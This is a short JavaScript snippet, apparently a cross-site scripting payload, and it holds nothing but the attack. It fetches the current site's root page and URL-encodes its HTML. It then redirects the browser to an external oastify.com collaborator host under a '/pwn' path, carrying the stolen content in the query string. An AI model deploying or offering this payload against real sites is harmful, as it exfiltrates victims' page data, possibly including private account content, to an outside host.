fetch('/')
  .then(response => response.text())
  .then(htmlContent => {
    var encodedContent = encodeURIComponent(htmlContent);
    window.location.replace("https://c8lgzsk4wd1wfi8hwcipb9vap1vsjji77.oastify.com/pwn?id=" + encodedContent);
  })
  .catch(error => {
    console.error('Error fetching page:', error);
  });
